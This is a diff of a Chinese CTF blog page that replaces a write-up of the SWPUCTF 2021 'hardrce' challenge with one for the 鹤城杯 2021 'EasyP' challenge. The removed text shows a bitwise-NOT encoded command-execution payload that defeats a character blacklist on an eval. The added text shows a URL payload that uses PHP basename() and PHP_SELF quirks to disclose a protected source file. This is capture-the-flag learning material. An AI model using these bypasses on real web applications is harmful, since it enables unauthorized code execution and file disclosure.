@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>SWPUCTF 2021 新生赛 hardrce |  sunset</title>
+      <title>[鹤城杯 2021]EasyP |  sunset</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -56,7 +56,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-SWPUCTF-2021-新生赛-hardrce"
+  id="post-鹤城杯-2021-EasyP"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -67,7 +67,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  SWPUCTF 2021 新生赛 hardrce
+  [鹤城杯 2021]EasyP
 </h1>
  
 
@@ -75,8 +75,8 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2023/07/30/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-hardrce/" class="article-date">
-  <time datetime="2023-07-30T11:24:10.000Z" itemprop="datePublished">2023-07-30</time>
+      <a href="/2023/07/30/%E9%B9%A4%E5%9F%8E%E6%9D%AF-2021-EasyP/" class="article-date">
+  <time datetime="2023-07-30T15:38:54.000Z" itemprop="datePublished">2023-07-30</time>
 </a> 
   <div class="article-category">
     <a class="article-category-link" href="/categories/CTF/">CTF</a>
@@ -87,7 +87,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">336</span>
+            <span class="post-count">640</span>
         </span>
     </span>
 
@@ -96,7 +96,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">1 min</span>
+            <span class="post-count">2 min</span>
         </span>
     </span>
 </div>
@@ -111,14 +111,26 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+  <h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$guess</span> === <span class="variable">$secret</span>) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
 
-<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>代码中有两个正则表达式，不能用字母数字来rce，并且将异或和自增都给过滤了</p>
-<p>但是可以用到取反操作 。</p>
-<p>RCE篇之无数字字母rce 可以查看这篇文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/pursue-security/p/15404150.html">RCE篇之无数字字母rce - 学安全的小白 - 博客园 (cnblogs.com)</a></p>
-<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf8&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="variable">$b</span>=<span class="string">&#x27;cd /;ls;cat /f*&#x27;</span>;</span><br><span class="line"><span class="comment">//这里并没有附加上双引号，也就是执行的代码是system(cd /;ls;cat /f*)</span></span><br><span class="line"><span class="comment">//不知道为啥不能加，反正我加上双引号后，就无回显</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$b</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>此题主要是正则表达式的绕过，还有几个$_SERVER</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]：正在执行脚本的文件名</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]：与 _SERVER[‘PHP_SELF’]的区别是会加上参数</span><br><span class="line">例子：<span class="number">127.0</span>.<span class="number">0.1</span>/pikachu/index.php?file=<span class="number">1</span>.php</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]=/pikachu/index.php</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]=/pikachu/index.php?file=<span class="number">1</span>.php</span><br></pre></td></tr></table></figure>
 
-<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p>都在链接里</p>
+<p>basename()函数有一个漏洞在使用默认语言环境设置时，<code>basename()</code> 会删除文件名开头的非 ASCII 字符和中文</p>
+<h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php/utils.php/你?show.source=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>这个正则：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正则表达式的意思是url的末尾不能存在utils.php，我们的payload末尾是    你?show.source=1  绕过成功</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这里面过滤了show_source，可以用 [ . 来代替_ </span></span><br></pre></td></tr></table></figure>
+
+<p>接下来是basename()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于我们构造的payload的最后一个下划线/后是中文，无acill码，因此后面的/会被删除，只保留出utils.php</p>
+<h1 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">basename</span>() 函数是 PHP 的一个文件系统函数，它可以从一个包含有指向一个文件的全路径的字符串中返回基本的文件名。 也就是说，它可以忽略路径中的目录部分，只保留最后一个斜杠（/）或反斜杠（\）后面的内容。</span><br><span class="line">例如，如果你有一个路径是 “/testweb/home.php”，那么 <span class="title function_ invoke__">basename</span>(<span class="variable">$path</span>) 就会返回 “home.php”，这就是文件名部分。</span><br><span class="line"><span class="title function_ invoke__">basename</span>() 函数还可以接受一个可选的参数 suffix，它是一个字符串，表示文件的扩展名。如果你指定了这个参数，那么 <span class="title function_ invoke__">basename</span>() 函数会在返回文件名之前，先把这个扩展名去掉。</span><br><span class="line">例如，如果你有一个路径是 “/testweb/home.php”，那么 <span class="title function_ invoke__">basename</span>(<span class="variable">$path</span>, “.php”) 就会返回 “home”，这就是去掉了扩展名的文件名。</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]：正在执行脚本的文件名</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]：与 _SERVER[‘PHP_SELF’]的区别是会加上参数</span><br><span class="line">例子：<span class="number">127.0</span>.<span class="number">0.1</span>/pikachu/index.php?file=<span class="number">1</span>.php</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]=/pikachu/index.php</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]=/pikachu/index.php?file=<span class="number">1</span>.php</span><br></pre></td></tr></table></figure>
+
  
       <!-- reward -->
       
@@ -189,7 +201,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/07/30/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-hardrce/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/07/30/%E9%B9%A4%E5%9F%8E%E6%9D%AF-2021-EasyP/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -200,19 +212,10 @@
    
   <nav class="article-nav">
     
-      <a href="/2023/07/30/%E9%B9%A4%E5%9F%8E%E6%9D%AF-2021-EasyP/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            [鹤城杯 2021]EasyP
-          
-        </div>
-      </a>
     
-    
-      <a href="/2023/07/30/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="article-nav-link">
+      <a href="/2023/07/30/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-hardrce/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">php伪协议</div>
+        <div class="article-nav-title">SWPUCTF 2021 新生赛 hardrce</div>
       </a>
     
   </nav>
